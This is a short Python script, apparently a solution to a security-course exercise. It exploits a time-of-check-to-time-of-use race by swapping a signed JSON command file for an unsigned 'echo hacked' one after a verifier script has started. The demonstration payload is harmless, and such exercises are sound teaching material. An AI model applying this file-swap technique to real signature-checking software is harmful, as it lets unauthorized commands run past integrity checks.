import json, threading, os, time    

def main():
    innocent = '{"command": "echo cool", "signature": "6c68e3c88a87339fa8667cb36c82d4cf0bdcc131efcf98eb8df1867122e66e0e2e9d8d1ce01c40261fb8bde61a7768215c20febc2cd522af3a2232be73cabe3ada6d86b1635a52c787bd7d97985f4ce2ef9b47ea0c72bdb35b702f9169218adc2d4cd53eabfc3c875bef05270b703d407afb5b22198d56f3489ec8e3241c19a9"}'
    with open("./bomb.json", 'w') as writer: #prepare inoccent json for alice to verify (taken from the example)
        writer.write(innocent)
    bad = json.dumps({'command': 'echo hacked'}) #prepare our malicious json
    x = threading.Thread(target=os.system, args = ("python ./run.py ./bomb.json",)) #start run on inoccent code
    x.start()
    time.sleep(2) #make sure there was a context switch
    with open("./bomb.json", 'w') as writer: #change the file so bob will get a different version
        writer.write(bad)

if __name__ == '__main__':
    import sys
    sys.exit(main())
